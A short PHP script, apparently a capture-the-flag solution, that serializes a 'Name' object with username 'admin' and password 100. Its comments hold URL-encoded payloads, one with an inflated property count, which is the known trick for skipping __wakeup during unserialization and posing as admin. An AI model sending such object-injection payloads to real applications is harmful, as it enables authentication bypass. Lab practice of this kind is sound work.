<?php



class Name{
    private $username = 'admin';
    private $password = 100;

}

$a=new Name();
echo serialize($a);

//O%3A4%3A"Name"%3A3%3A%7Bs%3A14%3A"%00Name%00username"%3Bs%3A5%3A"admin"%3Bs%3A14%3A"%00Name%00password"%3Bs%3A3%3A"100"%3B%7D
//O%3A4%3A%22Name%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%22admin%22%3Bs%3A8%3A%22password%22%3Bi%3A100%3B%7D
?>